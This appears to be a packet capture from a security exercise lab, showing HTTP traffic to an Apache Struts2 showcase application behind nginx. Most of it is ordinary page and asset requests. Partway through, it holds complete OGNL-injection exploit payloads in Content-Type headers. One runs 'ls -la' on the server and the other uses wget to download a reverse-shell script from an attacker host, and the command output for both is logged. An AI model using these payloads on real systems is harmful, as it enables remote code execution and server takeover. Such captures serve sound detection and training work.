+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"13632-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37877 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"20999-1362570424000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56550 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"20999-1362570424000".
+.
+
+
+T 192.168.33.1:56550 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/struts/utils.js HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37884 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/struts/utils.js HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37882 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"675-1362570424000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56551 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"675-1362570424000".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37880 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"93436-1362570428000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56553 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"93436-1362570428000".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37883 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"13632-1362570428000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56552 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"13632-1362570428000".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37881 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"25563-1362570428000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56554 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"25563-1362570428000".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37884 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Cache-Control: no-cache.
+Pragma: no-cache.
+Expires: -1.
+Content-Type: text/javascript.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+129b.
+/*
+ * $Id: utils.js 1240312 2012-02-03 19:44:51Z jogep $
+ *
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * "License"); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *  http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing,
+ * software distributed under the License is distributed on an
+ * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+ * KIND, either express or implied.  See the License for the
+ * specific language governing permissions and limitations
+ * under the License.
+ */
+
+var StrutsUtils = {};
+
+// gets an object with validation errors from string returned by 
+// the ajaxValidation interceptor
+StrutsUtils.getValidationErrors = function(data) {
+    if (typeof data === "object") {
+        return data;
+    }
+    else {
+        if (data.indexOf("/* {") === 0) {
+            return eval("( " + data.substring(2, data.length - 2) + " )");
+        } else {
+            return null;
+        }
+    }
+};
+
+StrutsUtils.clearValidationErrors = function(form) {
+    var firstNode = StrutsUtils.firstElement(form);
+    var xhtml = firstNode.tagName.toLowerCase() === "table";
+
+    if(xhtml) {
+        clearErrorMessagesXHTML(form);
+        clearErrorLabelsXHTML(form);
+    } else {
+        clearErrorMessagesCSS(form);
+        clearErrorLabelsCSS(form);
+    }
+
+    //clear previous global error messages
+.if(StrutsUtils.errorLists[form] && StrutsUtils.errorLists[form] !== null) {
+..form.parentNode.removeChild(StrutsUtils.errorLists[form]);
+..StrutsUtils.errorLists[form] = null;
+.}
+
+};
+
+StrutsUtils.errorLists = [];
+
+// shows validation errors using functions from xhtml/validation.js
+// or css_xhtml/validation.js
+StrutsUtils.showValidationErrors = function(form, errors) {
+    StrutsUtils.clearValidationErrors(form, errors);
+
+.if (errors.errors) {
+..var l, errorList = document.createElement("ul");
+
+..errorList.setAttribute("class", "errorMessage");
+..errorList.setAttribute("className", "errorMessage"); // ie hack cause ie does not support setAttribute
+
+..for ( l = 0; l < errors.errors.length; l++) {
+...var item = document.createElement("li");
+...var itemText = document.createTextNode(errors.errors[l]);
+...item.appendChild(itemText);
+
+...errorList.appendChild(item);
+..}
+..
+..form.parentNode.insertBefore(errorList, form);
+..StrutsUtils.errorLists[form] = errorList;
+.}
+
+  var i, fieldName, firstNode = StrutsUtils.firstElement(form);
+  var xhtml = firstNode.tagName.toLowerCase() === "table";
+  if(errors.fieldErrors) {
+    for(fieldName in errors.fieldErrors) {
+      if(errors.fieldErrors.hasOwnProperty(fieldName)) {
+        for(i = 0; i < errors.fieldErrors[fieldName].length; i++) {
+          if(xhtml) {
+            addErrorXHTML(form.elements[fieldName], errors.fieldErrors[fieldName][i]);
+          } else {
+            addErrorCSS(form.elements[fieldName], errors.fieldErrors[fieldName][i]);
+          }
+        }
+      }
+    }
+  }
+};
+
+StrutsUtils.firstElement  = function(parentNode, tagName) {
+  var node = parentNode.firstChild;
+  while(node && node.nodeType !== 1){
+    node = node.nextSibling;
+  }
+  if(tagName && node && node.tagName && node.tagName.toLowerCase() !== tagName.toLowerCase()) {
+    node = StrutsUtils.nextElement(node, tagName);
+  }
+  return node;  
+};
+
+StrutsUtils.nextElement = function(node, tagName) {
+  if(!node) { return null; }
+  do {
+    node = node.nextSibling;
+  } while(node && node.nodeType !== 1);
+
+  if(node && tagName && tagName.toLowerCase() !== node.tagName.toLowerCase()) {
+    return StrutsUtils.nextElement(node, tagName);
+  }
+  return node;  
+};
+
+StrutsUtils.previousElement = function(node, tagName) {
+  if(!node) { return null; }
+  if(tagName) { tagName = tagName.toLowerCase(); }
+  do {
+    node = node.previousSibling;
+  } while(node && node.nodeType !== 1);
+  
+  if(node
+
+T 192.168.1.100:80 -> 192.168.33.1:56550 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Content-Type: text/javascript.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Cache-Control: no-cache.
+Pragma: no-cache.
+Expires: -1.
+.
+f21.
+/*
+ * $Id: utils.js 1240312 2012-02-03 19:44:51Z jogep $
+ *
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * "License"); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *  http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing,
+ * software distributed under the License is distributed on an
+ * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+ * KIND, either express or implied.  See the License for the
+ * specific language governing permissions and limitations
+ * under the License.
+ */
+
+var StrutsUtils = {};
+
+// gets an object with validation errors from string returned by 
+// the ajaxValidation interceptor
+StrutsUtils.getValidationErrors = function(data) {
+    if (typeof data === "object") {
+        return data;
+    }
+    else {
+        if (data.indexOf("/* {") === 0) {
+            return eval("( " + data.substring(2, data.length - 2) + " )");
+        } else {
+            return null;
+        }
+    }
+};
+
+StrutsUtils.clearValidationErrors = function(form) {
+    var firstNode = StrutsUtils.firstElement(form);
+    var xhtml = firstNode.tagName.toLowerCase() === "table";
+
+    if(xhtml) {
+        clearErrorMessagesXHTML(form);
+        clearErrorLabelsXHTML(form);
+    } else {
+        clearErrorMessagesCSS(form);
+        clearErrorLabelsCSS(form);
+    }
+
+    //clear previous global error messages
+.if(StrutsUtils.errorLists[form] && StrutsUtils.errorLists[form] !== null) {
+..form.parentNode.removeChild(StrutsUtils.errorLists[form]);
+..StrutsUtils.errorLists[form] = null;
+.}
+
+};
+
+StrutsUtils.errorLists = [];
+
+// shows validation errors using functions from xhtml/validation.js
+// or css_xhtml/validation.js
+StrutsUtils.showValidationErrors = function(form, errors) {
+    StrutsUtils.clearValidationErrors(form, errors);
+
+.if (errors.errors) {
+..var l, errorList = document.createElement("ul");
+
+..errorList.setAttribute("class", "errorMessage");
+..errorList.setAttribute("className", "errorMessage"); // ie hack cause ie does not support setAttribute
+
+..for ( l = 0; l < errors.errors.length; l++) {
+...var item = document.createElement("li");
+...var itemText = document.createTextNode(errors.errors[l]);
+...item.appendChild(itemText);
+
+...errorList.appendChild(item);
+..}
+..
+..form.parentNode.insertBefore(errorList, form);
+..StrutsUtils.errorLists[form] = errorList;
+.}
+
+  var i, 
+
+T 192.168.33.1:56550 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/img/glyphicons-halflings.png HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/styles/bootstrap.css.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"12799-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37885 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/img/glyphicons-halflings.png HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/styles/bootstrap.css.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"12799-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37885 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"12799-1362570428000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56550 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"12799-1362570428000".
+.
+
+
+T 192.168.33.1:56549 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/img/struts-power.gif HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"1798-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37886 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/img/struts-power.gif HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"1798-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37886 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"1798-1362570428000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56549 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"1798-1362570428000".
+.
+
+
+T 192.168.33.20:57859 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37887 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37887 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:46:09 GMT.
+Connection: close.
+.
+3f9.
+total 12680
+drwxr-sr-x 18 root staff     4096 Jan 19 03:55 .
+drwxrwsr-x 21 root staff     4096 Jan 19 03:54 ..
+-rw-r--r--  1 root root     56846 Sep 29 12:27 LICENSE
+-rw-r--r--  1 root root      1239 Sep 29 12:27 NOTICE
+-rw-r--r--  1 root root      8965 Sep 29 12:27 RELEASE-NOTES
+-rw-r--r--  1 root root     16195 Sep 29 12:27 RUNNING.txt
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 bin
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 conf
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 include
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 lib
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 logs
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 native-jni-lib
+drwxr-sr-x  7 root root      4096 Jan 19 03:54 node_modules
+-rw-r--r--  1 root staff 12828110 Mar  6  2013 struts2-showcase-2.3.12.war
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 temp
+-rw-r--r--  1 root staff    15019 Jan 19 03:55 velocity.log
+drwxr-xr-x  8 root root      4096 Jan 19 03:54 webapps
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 work
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57859 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:46:09 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+3f9.
+total 12680
+drwxr-sr-x 18 root staff     4096 Jan 19 03:55 .
+drwxrwsr-x 21 root staff     4096 Jan 19 03:54 ..
+-rw-r--r--  1 root root     56846 Sep 29 12:27 LICENSE
+-rw-r--r--  1 root root      1239 Sep 29 12:27 NOTICE
+-rw-r--r--  1 root root      8965 Sep 29 12:27 RELEASE-NOTES
+-rw-r--r--  1 root root     16195 Sep 29 12:27 RUNNING.txt
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 bin
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 conf
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 include
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 lib
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 logs
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 native-jni-lib
+drwxr-sr-x  7 root root      4096 Jan 19 03:54 node_modules
+-rw-r--r--  1 root staff 12828110 Mar  6  2013 struts2-showcase-2.3.12.war
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 temp
+-rw-r--r--  1 root staff    15019 Jan 19 03:55 velocity.log
+drwxr-xr-x  8 root root      4096 Jan 19 03:54 webapps
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 work
+.
+
+
+T 192.168.33.20:57860 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://192.168.33.20:8081/reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37888 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://192.168.33.20:8081/reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37888 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:46:36 GMT.
+Connection: close.
+.
+199.
+--2018-01-19 04:46:36--  http://192.168.33.20:8081/reverseShellClient.js
+Connecting to 192.168.33.20:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1171 (1.1K) [application/javascript]
+Saving to: ...reverseShellClient.js...
+
+     0K .                                                     100%  124M=0s
+
+2018-01-19 04:46:36 (124 MB/s) - ...reverseShellClient.js... saved [1171/1171]
+
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57860 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:46:36 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+199.
+--2018-01-19 04:46:36--  http://192.168.33.20:8081/reverseShellClient.js
+Connecting to 192.168.33.20:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1171 (1.1K) [application/javascript]
+Saving to: ...reverseShellClient.js...
+
+     0K .                                                     100%  124M=0s
+
+2018-01-19 04:46:36 (124 MB/s) - ...reverseShellClient.js... saved [1171/1171]
+
+.
+
+
+T 192.168.33.1:56564 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+Host: target.cyexc-target.
+Accept: */*.
+Cookie: JSESSIONID=EF06922DB03D7158AC4F170594929E81.
+User-Agent: Bear/5767 CFNetwork/893.13.1 Darwin/17.3.0 (x86_64).
+Accept-Language: ja-jp.
+Accept-Encoding: gzip, deflate.
+Connection: keep-alive.
+.
+
+
+T 192.168.1.100:37890 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+Accept: */*.
+Cookie: JSESSIONID=EF06922DB03D7158AC4F170594929E81.
+User-Agent: Bear/5767 CFNetwork/893.13.1 Darwin/17.3.0 (x86_64).
+Accept-Language: ja-jp.
+Accept-Encoding: gzip, deflate.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37890 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Set-Cookie: JSESSIONID=8B2D9A1FB24A22C9E3DD94CCF8B9DA7F; Path=/struts2-showcase-2.3.12; HttpOnly.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:46:50 GMT.
+Connection: close.
+.
+2000.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
